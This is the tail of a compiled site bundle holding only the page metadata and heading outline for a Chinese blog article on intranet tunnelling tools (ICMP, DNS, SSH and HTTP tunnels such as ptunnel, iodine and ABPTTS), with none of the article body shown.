serv..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"隧道"}],["meta",{"property":"article:tag","content":"工具"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"内网隧道工具使用\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"1. ICMP 隧道","slug":"_1-icmp-隧道","link":"#_1-icmp-隧道","children":[{"level":3,"title":"1.1 ptunnel","slug":"_1-1-ptunnel","link":"#_1-1-ptunnel","children":[]},{"level":3,"title":"1.2 pingtunnel","slug":"_1-2-pingtunnel","link":"#_1-2-pingtunnel","children":[]}]},{"level":2,"title":"2. DNS 隧道","slug":"_2-dns-隧道","link":"#_2-dns-隧道","children":[{"level":3,"title":"2.1 iodine","slug":"_2-1-iodine","link":"#_2-1-iodine","children":[]},{"level":3,"title":"2.2 dns2tcp","slug":"_2-2-dns2tcp","link":"#_2-2-dns2tcp","children":[]}]},{"level":2,"title":"3. SSH 隧道","slug":"_3-ssh-隧道","link":"#_3-ssh-隧道","children":[]},{"level":2,"title":"4. TCP over HTTP","slug":"_4-tcp-over-http","link":"#_4-tcp-over-http","children":[{"level":3,"title":"4.1 ABPTTS","slug":"_4-1-abptts","link":"#_4-1-abptts","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":4}]},"readingTime":{"minutes":12.65,"words":3796},"filePathRelative":"CyberSecurity/RedTeam/Tools/Tunnel.md","localizedDate":"2024年11月15日","excerpt":"\\n<p>记录几种常用内网隧道工具的使用，按隧道类型分类，例如 ICMP、DNS 隧道等。</p>\\n","autoDesc":true}');export{X as comp,j as data};
